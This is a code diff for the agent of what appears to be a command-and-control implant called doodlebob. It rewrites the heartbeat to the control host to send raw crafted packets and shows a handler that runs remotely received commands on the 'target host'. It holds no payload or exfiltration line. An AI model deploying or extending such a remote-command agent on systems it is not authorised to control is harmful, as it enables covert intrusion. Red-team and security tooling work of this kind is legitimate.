@@ -3,13 +3,16 @@
 package agent
 
 import (
+	"context"
 	"fmt"
 	"net"
 	"strconv"
+	"time"
 
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/internal/network"
 	"github.com/MeHungr/doodlebob/pkg/executor"
+	"github.com/google/gopacket/layers"
 )
 
 // sendHeartbeat sends a heartbeat message to the control host
@@ -24,29 +27,37 @@ func sendHeartbeat(msg *message.Message) error {
 		return fmt.Errorf("converting string to integer: %w", err)
 	}
 
-	// Create UDPAddr objects for the addresses
-	remoteAddr := &net.UDPAddr{
-		IP:   net.ParseIP(msg.SrcIP),
-		Port: remotePort,
-	}
+	// Set vars
+	srcIP := net.ParseIP(msg.DstIP)
+	srcPort := localPort
+	dstIP := net.ParseIP(msg.SrcIP)
+	dstPort := remotePort
 
-	localAddr := &net.UDPAddr{
-		IP:   net.ParseIP(msg.DstIP),
-		Port: localPort,
-	}
+	// Get route to destination IP
+	iface, _, srcIP, err := network.LookupRoute(dstIP)
 
-	// Dial the control host at the udp port
-	conn, err := net.DialUDP("udp", localAddr, remoteAddr)
+	srcMAC := iface.HardwareAddr
+
+	// Get default interface
+	device, err := network.GetNetworkInterface(srcIP)
 	if err != nil {
-		return fmt.Errorf("error connecting to control host: %w", err)
+		return err
 	}
-	defer conn.Close() // Close connection when function returns
 
-	// Send "heartbeat" over the connection
-	_, err = conn.Write([]byte("heartbeat"))
+	// Setup context variable
+	ctx, cancel := context.WithTimeout(
+		context.Background(),
+		3*time.Second,
+	)
+	defer cancel()
+
+	// Resolve next-hop
+	nextHopMAC, err := network.ResolveNextHopMAC(ctx, dstIP)
 	if err != nil {
-		return fmt.Errorf("error sending heartbeat: %w", err)
+		return err
 	}
+
+	sendPacket(device, srcMAC, nextHopMAC, layers.EthernetTypeIPv4, srcIP, dstIP, srcPort, dstPort, network.UDP, []byte("heartbeat"))
 
 	return nil
 }
@@ -64,7 +75,7 @@ func handleMessage(msg *message.Message) error {
 			}
 		// Executes the command on the target host
 		case message.Command:
-			outputChan := make (chan []string, 1)
+			outputChan := make(chan []string, 1)
 			go func() {
 				out, ret := executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
 				outputChan <- []string{out, ret}
